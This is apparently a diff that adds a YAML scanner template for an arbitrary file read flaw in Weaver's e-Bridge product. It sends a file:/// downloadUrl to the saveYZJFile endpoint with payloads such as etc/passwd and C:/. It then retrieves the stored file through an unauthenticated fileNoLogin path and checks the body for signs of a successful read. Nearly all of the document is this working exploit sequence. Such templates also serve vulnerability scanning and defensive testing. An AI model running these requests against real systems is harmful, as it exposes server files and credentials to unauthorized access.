@@ -1,0 +1,53 @@
+info:
+  vulId: weaver_bridge_fileread
+  detail: 泛微云桥e-Bridge saveYZJFile任意文件读取
+  fofaQuery:
+rules:
+  - request:
+      payload:
+        - "etc/passwd"
+        - "C:/"
+      path: "{{rootUrl}}/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///{{payload}}&fileExt=txt"
+      method: GET
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+      redirect: false
+      dataType: text
+      data: ""
+    checksCondition: and
+    checks:
+      - checkType: regex
+        desireds:
+          - "\"id\":\"(.*?)\","
+        place: body
+        condition: and
+
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
+
+  - request:
+      payload:
+        - ""
+      path: "{{rootUrl}}/file/fileNoLogin/{{variable[0]}}"
+      method: GET
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+      redirect: false
+      dataType: text
+      data: ""
+    checksCondition: and
+    checks:
+      - checkType: string
+        desireds:
+          - Windows
+          - ProgramData
+          - /sbin/nologin
+        place: body
+        condition: or
+
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
